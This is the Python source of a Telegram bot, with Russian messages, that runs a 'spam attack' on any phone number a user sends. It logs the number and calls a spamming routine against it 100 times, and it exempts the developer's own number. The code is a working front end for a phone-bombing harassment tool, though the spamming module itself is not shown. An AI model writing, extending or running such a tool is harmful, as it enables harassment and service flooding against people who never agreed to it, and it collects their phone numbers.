import telebot
import spamer
import constants
import checker
import re
import log

bot = telebot.TeleBot(constants.token)


@bot.message_handler(commands=['start', 'attack'])
def offer_to_spam(message):
    start = 'Введите номер телефона для спам атаки :)'
    bot.send_message(message.chat.id, start)


@bot.message_handler(content_types=['text'])
def spam_start(message):
    text_mes = message.text
    if checker.check_phone(text_mes):
        #log.log_user(message.chat.username)
        # to protect developer
        if re.fullmatch(r'.*98143550231', text_mes):
            for i in range(100):
                bot.send_message(message.chat.id, 'Это ты зря!')
        else:
            bot.send_message(message.chat.id, 'Атака запущена!')
            log.log_phone(text_mes)
            for i in range(100):
                spamer.spam(phone=text_mes)

    else:
        bot.send_message(message.chat.id,
                         'Некорректный номер телефона :( Введите команду /attack, чтоб попробовать ещё раз')


bot.polling(none_stop=True, interval=0.5)
